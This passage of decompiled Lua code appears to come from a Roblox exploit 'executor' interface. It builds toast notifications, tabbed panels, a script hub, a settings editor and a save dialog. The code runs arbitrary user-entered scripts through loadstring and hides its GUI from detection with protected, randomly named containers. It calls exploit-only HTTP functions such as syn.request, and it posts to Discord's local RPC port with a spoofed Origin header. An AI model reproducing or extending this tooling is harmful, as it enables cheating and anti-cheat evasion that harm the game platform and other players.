			v1691.Size = UDim2.new(0, 340, 0, 70);
			v1691.AnchorPoint = Vector2.new(0, 1);
			v1691.Position = UDim2.new(1, 0, 1, -30);
			v1691.BorderSizePixel = 0;
			v1691.BackgroundTransparency = 1;
			local v2583 = v1691:Clone();
			v2583.Name = "Underline";
			v2583.Parent = v1691;
			v2583.AnchorPoint = Vector2.new(0.5, 1);
			v2583.Position = UDim2.new(0.5, 0, 1, 0);
			v2583.Size = UDim2.new(0, 0, 0.06, 0);
			v2583.Rotation = 180;
			v2583.ImageRectSize = Vector2.new(200, 120);
		end
		function v1369(v2591, v2592)
			local v2593 = v2592.Title;
			local v2594 = v2592.Text or "None";
			local v2595 = v2592.Icon;
			local v2596 = v2592.Duration or v1685;
			local v2597 = v2592.TextColor or v1686;
			local v2598 = v2592.BackgroundColor or v1687;
			local v2599 = v1688[v2591] or {};
			v1688[v2591] = v2599;
			local v2601 = v1691:Clone();
			local v2602 = v2601.Underline;
			local v2603 = v2599[#v2599] or v2601;
			v2601.Parent = v2591;
			v2599[#v2599 + 1] = v2601;
			local v2606 = #v2599;
			v1689[v2601] = v2606;
			v2601.ImageColor3 = v2598;
			v2602.ImageColor3 = v2597;
			local v2610 = v1682;
			local v2611;
			if v2595 then
				v2611 = Instance.new("ImageLabel", v2601);
				v2611.BackgroundTransparency = 1;
				v2611.Image = v2595;
				v2611.Position = UDim2.new(0, v1682, 0.5, 0);
				v2611.AnchorPoint = Vector2.new(0, 0.5);
				local v3061 = v2601.Size.Y.Offset - (v2611.Position.X.Offset * 2);
				v2611.Size = UDim2.new(0, v3061, 0, v3061);
				v2610 = (v1682 * 2) + v3061;
			end
			local v2612;
			local v2613 = (v2601.Size.X.Offset - v2610) - (v1682 / 2);
			if v2593 then
				v2612 = Instance.new("TextLabel", v2601);
				v2612.BackgroundTransparency = 1;
				v2612.TextXAlignment = Enum.TextXAlignment.Left;
				v2612.Text = v2593;
				v2612.TextColor3 = v2597;
				v2612.TextSize = v2592.TitleSize or 13;
				v2612.Size = UDim2.new(0, v2613, 0, v2612.TextSize);
				v2612.Position = UDim2.new(0, v2610, 0, v1682 - 5);
			end
			local v2614 = Instance.new("TextLabel", v2601);
			v2614.BackgroundTransparency = 1;
			v2614.TextXAlignment = Enum.TextXAlignment.Left;
			v2614.TextYAlignment = Enum.TextYAlignment.Top;
			v2614.TextWrapped = true;
			v2614.TextSize = v2592.TextSize or 10;
			v2614.TextColor3 = v2597;
			v2614.AnchorPoint = Vector2.new(0, 0);
			v2614.Text = v2594;
			if v2612 then
				local v3071 = -(v2614.TextSize + v1682);
				v2614.Size = UDim2.new(0, v2613, 0, (v2601.AbsoluteSize.Y + v3071) - v1682);
				v2614.Position = UDim2.new(0, v2610, 1, v3071);
			else
				v2614.TextYAlignment = Enum.TextYAlignment.Center;
				v2614.Size = UDim2.new(0, v2613, 1, -(v1682 * 2));
				v2614.AnchorPoint = Vector2.new(0, 0.5);
				v2614.Position = UDim2.new(0, v2610, 0.5, 0);
			end
			if v2611 then
				v2611.ImageColor3 = v1353.DarkerColor(v2597, 0.2);
			end
			if v2592.Sound then
				v2592.Sound:Play();
			end
			v2601.Position = UDim2.new(1, v2601.Size.X.Offset + v1681, 1, 0);
			v1337:Create(v2601, v1683, {Position=UDim2.new(1, -v2601.Size.X.Offset - v1681, 1, v2606 * -(v2601.Size.Y.Offset + v1681))}):Play();
			v2601.Changed:Connect(function(v2918)
				if (v2918 == "ImageTransparency") then
					v2602.ImageTransparency = v2601.ImageTransparency;
					v2614.TextTransparency = v2601.ImageTransparency;
					if v2612 then
						v2612.TextTransparency = v2601.ImageTransparency;
					end
					if v2611 then
						v2611.ImageTransparency = v2601.ImageTransparency;
					end
				end
			end);
			local v2626 = v1337:Create(v2602, TweenInfo.new(v2596, Enum.EasingStyle.Linear, Enum.EasingDirection.Out), {Size=UDim2.new(0.97, 0, v2602.Size.Y.Scale, 0)});
			v2626:Play();
			spawn(function()
				v2626.Completed:Wait();
				v1337:Create(v2602, v1683, {Size=UDim2.new(0, 0, v2602.Size.Y.Scale, 0)}):Play();
				v1337:Create(v2601, v1683, {Size=UDim2.new(0, v2601.Size.X.Offset / 1.03, 0, v2601.Size.Y.Offset / 1.03),ImageTransparency=0.1}):Play();
				wait(0.5);
				local v2919 = v1337:Create(v2601, v1683, {Position=UDim2.new(1, v2601.Size.X.Offset + v1681, 1, v2601.Position.Y.Offset)});
				v2919:Play();
				v2919.Completed:Wait();
				local v2920 = v1689[v2601];
				v1689[v2601] = nil;
				table.remove(v2599, v2920);
				for v3080, v3081 in next, v2599 do
					v1689[v3081] = v3080;
					local v3081 = v2599[v3080];
					v1337:Create(v3081, v1684, {Position=UDim2.new(1, -v3081.Size.X.Offset - v1681, 1, v3080 * -(v3081.Size.Y.Offset + v1681))}):Play();
				end
				v2601:Destroy();
			end);
		end
	end
	local v1370 = {new=v1363,CreateClass=v1362,GetInstance=v1365,GetMeta=v1333,NewCanvas=v1366,GetHiddenGui=v1351,ProtectGui=v1352,Enum=v1354,IsEnum=v1356,IsMagnolia=v1364,ModernColors=v1357,Math=v1358,Utils=v1353,ToastAlert=v1369};
	return v1370;
end};
local function v1175()
	local v1371 = v0["16"];
	local v1372 = game:GetService("TweenService");
	local v1373 = game:GetService("HttpService");
	local v1374 = "xJHCqm84cW";
	local v1375 = (syn and syn.request) or http_request or function()
	end;
	local v1376 = v1160(v1371.Parent.Parent.Parent.Parent.Parent.utils);
	local v1377 = v1371.Parent.Hitbox;
	local v1378 = v1371.Parent.ImageLabel;
	local v1379 = v1376.modernColors.ElectricBlue;
	local v1380 = v1378.ImageColor3;
	local v1381 = v1372:Create(v1378, v1376.tweenInfo.hover, {ImageColor3=v1379});
	local v1382 = v1372:Create(v1378, v1376.tweenInfo.hover, {ImageColor3=v1380});
	v1377.MouseEnter:Connect(function()
		v1381:Play();
	end);
	v1377.MouseLeave:Connect(function()
		v1382:Play();
	end);
	v1377.MouseButton1Click:Connect(function()
		if not v1375 then
			warn("Exploit not supported. No HTTP found.");
			return;
		end
		v1375({Url="http://127.0.0.1:6463/rpc?v=1",Method="POST",Headers={["Content-Type"]="application/json",Origin="https://discord.com"},Body=v1373:JSONEncode({cmd="INVITE_BROWSER",nonce=v1373:GenerateGUID(false),args={code=v1374}})});
	end);
end
task.spawn(v1175);
local function v1176()
	local v1383 = v0["18"];
	local v1384 = v1383.Parent;
	local v1385 = v1383.Parent.Parent.Parent.Parent.BodyClipping.Executor.InnerBody.SourceBg.Source.ScrollingFrame.SourceBox;
	local v1386 = "%d\n——\n%d";
	v1385:GetPropertyChangedSignal("Text"):Connect(function()
		local v1692 = #v1385.Text;
		local v1693 = 0;
		if (v1692 > 0) then
			_, v1693 = v1385.Text:gsub("\n", "");
			v1693 += 1
		end
		v1384.Text = v1386:format(v1692, v1693);
	end);
end
task.spawn(v1176);
local function v1177()
	local v1387 = v0["21"];
	local v1388 = game:GetService("TweenService");
	local v1389 = game:GetService("Players");
	local v1390 = v1389.LocalPlayer;
	local v1391 = v1160(v1387.Parent.Parent.Parent.utils);
	local v1392 = v1387.Parent.Top;
	local v1393 = v1392.bg;
	local v1394 = v1387.Parent.Parent.BodyClipping;
	local v1395 = {[v1392.HomeBtn]=v1394.Executor,[v1392.MenuBtn]=v1394.Games,[v1392.SettingsBtn]=v1394.Settings};
	local v1396;
	local v1397 = 20;
	local v1398 = 22;
	local function v1399(v1695)
		if v1396 then
			v1388:Create(v1396, v1391.tweenInfo.expand, {Size=UDim2.new(0, v1397, 0, v1397),ImageColor3=Color3.fromRGB(37, 37, 37)}):Play();
			v1395[v1396].Visible = false;
		end
		v1395[v1695].Visible = true;
		v1388:Create(v1695, v1391.tweenInfo.expand, {Size=UDim2.new(0, v1398, 0, v1398),ImageColor3=Color3.fromRGB(181, 181, 181)}):Play();
		v1388:Create(v1393, v1391.tweenInfo.move, {Position=v1695.Position}):Play();
		v1396 = v1695;
	end
	for v1697, v1698 in next, v1392:GetChildren() do
		if v1698:IsA("ImageLabel") then
			v1698.Hitbox.MouseButton1Click:Connect(function()
				v1399(v1698);
			end);
		end
	end
	v1399(v1392.HomeBtn);
end
task.spawn(v1177);
local function v1178()
	local v1400 = v0["3e"];
	local v1401 = game:GetService("TweenService");
	local v1402 = v1160(v1400.Parent.Parent.Parent.Parent.Parent.Parent.Parent.utils);
	local v1403 = v1400.Parent.TextBox;
	local v1404 = v1400.Parent.Parent.Scripts;
	local v1405 = v1402.modernColors.ElectricBlue;
	local v1406 = v1403.PlaceholderColor3;
	local v1407 = Color3.fromRGB(21, 21, 21);
	local v1408 = v1401:Create(v1403, v1402.tweenInfo.hover, {TextColor3=v1405,PlaceholderColor3=v1405});
	local v1409 = v1401:Create(v1403, v1402.tweenInfo.hover, {TextColor3=v1406,PlaceholderColor3=v1406});
	local v1410 = v1401:Create(v1400.Parent, v1402.tweenInfo.hover, {BorderColor3=v1405});
	local v1411 = v1401:Create(v1400.Parent, v1402.tweenInfo.hover, {BorderColor3=v1407});
	v1403.Focused:Connect(function()
		v1408:Play();
		v1410:Play();
	end);
	v1403.FocusLost:Connect(function()
		v1409:Play();
		v1411:Play();
	end);
	v1403:GetPropertyChangedSignal("TextColor3"):Connect(function()
		v1400.Parent.ImageLabel.ImageColor3 = v1403.TextColor3;
	end);
	v1403:GetPropertyChangedSignal("Text"):Connect(function()
		local v1701 = v1403.Text:lower();
		for v2627, v2628 in next, v1404:GetChildren() do
			if not v2628:IsA("ImageLabel") then
				continue;
			end
			if v2628.Name:lower():find(v1701) then
				v2628.Visible = true;
			else
				v2628.Visible = false;
			end
		end
	end);
end
task.spawn(v1178);
local function v1179()
	local v1412 = v0["45"];
	local v1413 = v1412.Parent.Hitbox;
	local v1414 = v1160(v1412.Parent.Parent.Parent.Parent.Parent.Parent.Parent.editor);
	v1413.MouseButton1Click:Connect(v1414.clearCurrent);
end
task.spawn(v1179);
local function v1180()
	local v1415 = v0["4a"];
	local v1416 = v1415.Parent.Hitbox;
	local v1417 = v1415.Parent.Parent.Parent.Parent.Parent.Parent.SavePopup;
	v1416.MouseButton1Click:Connect(function()
		v1417.Visible = true;
	end);
end
task.spawn(v1180);
local function v1181()
	local v1418 = v0["4f"];
	local v1419 = v1418.Parent.Parent.Parent.SourceBg.Source;
	v1418.Parent.Hitbox.MouseButton1Click:Connect(function()
		v1419.Visible = not v1419.Visible;
	end);
end
task.spawn(v1181);
local function v1182()
	local v1420 = v0["52"];
	v1420.Parent.Hitbox.MouseButton1Click:Connect(function()
		loadstring(v0["2c"]['Text'])();
	end);
end
task.spawn(v1182);
local function v1183()
	local v1421 = v0["55"];
	local v1422 = game:GetService("TweenService");
	local v1423 = v1160(v1421.Parent.Parent.Parent.Parent.Parent.Parent.utils);
	local v1424 = v1421.Parent;
	local v1425 = v1423.modernColors.ElectricBlue;
	local v1426 = Color3.fromRGB(170, 170, 170);
	local function v1427(v1704)
		local v1705 = v1704.Hitbox;
		v1705.MouseEnter:Connect(function()
			v1422:Create(v1704.ImageButton, v1423.tweenInfo.hover, {ImageColor3=v1425}):Play();
			v1422:Create(v1704.TextLabel, v1423.tweenInfo.hover, {TextColor3=v1425}):Play();
		end);
		v1705.MouseLeave:Connect(function()
			v1422:Create(v1704.ImageButton, v1423.tweenInfo.hover, {ImageColor3=v1426}):Play();
			v1422:Create(v1704.TextLabel, v1423.tweenInfo.hover, {TextColor3=v1426}):Play();
		end);
	end
	for v1706, v1707 in ipairs(v1421.Parent:GetChildren()) do
		if v1707:IsA("ImageButton") then
			v1427(v1707);
		end
	end
end
task.spawn(v1183);
local function v1184()
	local v1428 = v0["7f"];
	local v1429 = v1428.Parent.Parent.Parent.Parent;
	local v1430 = v1160(v1429.config);
	local v1431 = v1160(v1429.magnolia);
	local v1432 = v1428.Parent.InnerBody.ScrollingFrame;
	local v1433 = v1432.dummy;
	v1433.Parent = nil;
	local v1435 = {codeColors="Code Editor",canDebug="Can Debug"};
	local v1436;
	local v1437 = v1431.new("ColorPicker", v1429.Main);
	v1437.AnchorPoint = Vector2.new(0.5, 0.5);
	v1437.Position = UDim2.fromScale(0.5, 0.5);
	v1437.ZIndex = 100;
	v1437.Visible = false;
	v1437:Open();
	v1429.Main.UICorner:Clone().Parent = v1431.GetInstance(v1437);
	local v1443 = 0;
	local function v1444(v1708, v1709, v1710)
		local v1711;
		local v1712 = v1435[v1708] or v1708;
		local v1713 = v1710 or v1430.data.settings;
		if (typeof(v1709) == "Color3") then
			v1711 = v1433:Clone();
			local v2923 = Instance.new("ImageButton", v1711);
			v2923.Size = UDim2.fromOffset(20, 20);
			v2923.AnchorPoint = Vector2.new(1, 0.5);
			v2923.Position = UDim2.fromScale(1, 0.5);
			v2923.BackgroundColor3 = v1709;
			local v2928 = Instance.new("UICorner", v2923);
			v2928.CornerRadius = UDim.new(1, 0);
			v2923.MouseButton1Click:Connect(function()
				v1437.Visible = not v1437.Visible;
				if v1437.Visible then
					v1437:SelectColor(v2923.BackgroundColor3);
					v1436 = v1437.ColorChanged:Connect(function()
						v1713[v1708] = v1437.Color;
						v2923.BackgroundColor3 = v1437.Color;
						v1430.save();
					end);
				else
					v1436:Disconnect();
				end
			end);
		elseif (type(v1709) == "boolean") then
			v1711 = v1433:Clone();
			local v3204 = v1431.new("Switch", v1711);
			v3204.AnchorPoint = Vector2.new(1, 0.5);
			v3204.Position = UDim2.fromScale(1, 0.5);
			v3204:Toggle(v1709);
			v3204.ValueChanged:Connect(function()
				v1713[v1708] = v3204.Value;
				v1430.save();
			end);
		elseif (v1709 == nil) then
			v1711 = v1433:Clone();
			v1711.Title.Font = Enum.Font.SourceSansBold;
		end
		if v1711 then
			v1443 += 1
			v1711.Name = tostring(v1443);
			v1711.Title.Text = v1712;
			v1711.Parent = v1432;
			if v1710 then
				v1711.Title.Position = UDim2.new(0, 20, 0.5, 0);
			end
		end
	end
	local function v1445(v1714, v1715)
		for v2629, v2630 in next, v1714 do
			if (type(v2630) == "table") then
				v1444(v2629);
				v1445(v2630, v2630);
			else
				v1444(v2629, v2630, v1715);
			end
		end
		v1432.CanvasSize = UDim2.fromOffset(0, (v1443 * v1433.AbsoluteSize.Y) + (v1443 * v1432.UIListLayout.Padding.Offset));
	end
	v1428.Parent:GetPropertyChangedSignal("Visible"):Connect(function()
		if (v1428.Parent.Visible == false) then
			v1437.Visible = false;
			if v1436 then
				v1436:Disconnect();
			end
		end
	end);
	v1445(v1430.data.settings);
end
task.spawn(v1184);
local function v1185()
	local v1446 = v0["80"];
	local v1447 = game:GetService("RunService");
	local v1448 = game:GetService("TweenService");
	local v1449 = game:GetService("Players");
	local v1450 = game:GetService("UserInputService");
	local v1451 = v1449.LocalPlayer;
	local v1452 = v1451:GetMouse();
	local v1453 = v1160(v1446.Parent.Parent.utils);
	local v1454 = v1446.Parent;
	local v1455 = v1446.Parent.Topbar.Hitbox;
	local v1456 = v1453.tweenInfo.move;
	local v1457;
	local v1458;
	local v1459 = v1450.TouchEnabled;
	local function v1460()
		local v1717;
		if v1459 then
			v1717 = UDim2.fromOffset(v1452.X, v1452.Y);
		else
			local v2934 = Vector2.new(v1452.X, v1452.Y) - v1454.AbsolutePosition;
			local v2935 = v1454.AbsolutePosition + (v2934 - v1458);
			v1717 = UDim2.fromOffset(v2935.X, v2935.Y);
		end
		v1448:Create(v1454, v1456, {Position=v1717}):Play();
	end
	local function v1461()
		if v1457 then
			v1457:Disconnect();
			v1457 = nil;
		end
	end
	v1453.onDownUp(v1455, function()
		v1461();
		v1458 = Vector2.new(v1452.X, v1452.Y) - v1454.AbsolutePosition;
		v1457 = v1447.RenderStepped:Connect(v1460);
	end, function()
		v1461();
	end);
end
task.spawn(v1185);
local function v1186()
	local v1462 = v0["83"];
	local v1463 = v1160(v1462.Parent.Parent.Parent.utils);
	local v1464 = game:GetService("RunService");
	local v1465 = Vector2.new(503, 248);
	local v1466 = Vector2.new(720, 432);
	local v1467 = game:GetService("Players").LocalPlayer:GetMouse();
	local v1468;
	local v1469 = v1467.Icon;
	local v1470 = v1462.Parent.Parent;
	local v1471 = v1462.Parent;
	v1471.MouseEnter:Connect(function()
		if v1468 then
			return;
		end
		v1469 = v1467.Icon;
		v1467.Icon = "rbxassetid://10406654632";
	end);
	v1471.MouseLeave:Connect(function()
		v1467.Icon = v1469;
	end);
	local function v1472()
		if not v1468 then
			return;
		end
		v1468:Disconnect();
		v1468 = nil;
		v1467.Icon = v1469;
	end
	local function v1473()
		v1467.Icon = "rbxassetid://10406654632";
		local v1722 = Vector2.new(v1467.X, v1467.Y);
		local v1723 = v1722 - v1470.AbsolutePosition;
		local v1724 = UDim2.new(0, math.clamp(v1723.X, v1465.X, v1466.X), 0, math.clamp(v1723.Y, v1465.Y, v1466.Y));
		v1470.Size = v1724;
	end
	v1463.onDownUp(v1471, function()
		v1472();
		v1468 = v1464.RenderStepped:Connect(v1473);
	end, function()
		v1472();
	end);
end
task.spawn(v1186);
local function v1187()
	local v1474 = v0["86"];
	local v1475 = v1474.Parent.Parent.Parent;
	local v1476 = v1474.Parent.ImageLabel.Hitbox;
	local v1477 = v1160(v1475.config);
	local v1478 = v1160(v1475.magnolia);
	local v1479 = v1160(v1475.scripthub);
	local v1480 = v1160(v1475.editor);
	v1476.MouseButton1Click:Connect(function()
		v1474.Parent.Visible = false;
	end);
	local v1481 = v1478.new("TextBox", v1474.Parent);
	local v1482 = v1478.GetMeta(v1481).__TextBox;
	v1481.PlaceholderText = "Script Name";
	v1481.Position = UDim2.fromScale(0.5, 0.5);
	v1481.AnchorPoint = Vector2.new(0.5, 0.5);
	v1481.Size = UDim2.new(1, -20, 0, 24);
	local v1487 = v1478.new("ButtonIcon", v1474.Parent);
	v1487.Position = UDim2.fromScale(0.5, 0.8);
	v1487.AnchorPoint = Vector2.new(0.5, 0.5);
	v1487.Size = UDim2.fromOffset(40, 40);
	v1487.IconSize = 20;
	v1487.Image = "rbxassetid://4732495519";
	v1487.Clicked:Connect(function()
		local v1727 = v1480.getCode();
		local v1728 = v1481.Text;
		if (#v1728 == 0) then
			return;
		end
		v1479.addScript(v1728, v1727, true);
		v1477.data.scripts[v1728] = v1727;
		v1477.save();
		v1474.Parent.Visible = false;
	end);
	v1474.Parent:GetPropertyChangedSignal("Visible"):Connect(function()
		if v1474.Parent.Visible then
			v1482:CaptureFocus();
		end
	end);
end
task.spawn(v1187);
local function v1188()
	local v1493 = v0["8e"];
	local v1494 = game:GetService("TweenService");
	local v1495 = v1160(v1493.Parent.utils);
	local v1496 = v1493.Parent.Main;
	local v1497 = v1496.BodyClipping;
	local v1498 = v1496.Resize;
	local v1499 = v1496.Sidebar;
	local v1500 = v1496.Topbar;
	local v1501 = v1496.UICorner;
	local v1502 = v1496.Size;
	local v1503 = v1501.CornerRadius;
	local v1504 = Instance.new("ImageLabel", v1496);
	v1504.BackgroundTransparency = 1;
	v1504.Image = "rbxassetid://140220253874434";
	v1504.Size = UDim2.new(0, 80, 0, 80);
	v1504.AnchorPoint = Vector2.new(0.5, 0.5);
	v1504.Position = UDim2.new(0.5, 0, 0.5, 0);
	v1497.Visible = false;
	v1498.Visible = false;
	v1499.Visible = false;
	v1500.Visible = false;
	v1501.CornerRadius = UDim.new(1, 0);
	v1496.Size = UDim2.new(0, 100, 0, 100);
	v1496.AnchorPoint = Vector2.new(0.5, 0.5);
	v1496.Position = UDim2.new(0.5, 0, 1, v1496.AbsoluteSize.Y);
	v1501:Clone().Parent = v1504;
	for v1731, v1732 in next, v1497:GetChildren() do
		v1732.Visible = false;
	end
	v1497.Executor.Visible = true;
	if game:GetService("RunService"):IsStudio() then
		task.wait(1);
	end
	local v1520 = v1494:Create(v1496, v1495.tweenInfo.slowBackMove, {Position=UDim2.new(0.5, 0, 0.5, 0)});
	v1494:Create(v1504, v1495.tweenInfo.slowBackMove, {Rotation=(360 * 2)}):Play();
	v1520:Play();
	v1520.Completed:Wait();
	local v1521 = v1494:Create(v1496, v1495.tweenInfo.expand, {Size=v1502});
	v1521:Play();
	v1494:Create(v1501, v1495.tweenInfo.expand, {CornerRadius=v1503}):Play();
	v1494:Create(v1504, v1495.tweenInfo.expand, {ImageTransparency=1}):Play();
	v1521.Completed:Wait();
	v1504:Destroy();
	v1496.AnchorPoint = Vector2.new(0, 0);
	v1496.Position = UDim2.new(0.5, -v1502.X.Offset / 2, 0.5, -v1502.Y.Offset / 2);
	v1497.Visible = true;
	v1498.Visible = true;
	v1499.Visible = true;
	v1500.Visible = true;
end
task.spawn(v1188);
local function v1189()
	local v1522 = v0["95"];
	local v1523 = v1160(v1522.Parent.magnolia);
	local v1524 = v1522.Parent;
	v1523.ProtectGui(v1524);
	v1524.Name = v1523.Utils.RandomString(math.random(5, 8));
	v1524.Parent = v1523.GetHiddenGui();
end
task.spawn(v1189);
return v0["1"], v1160;
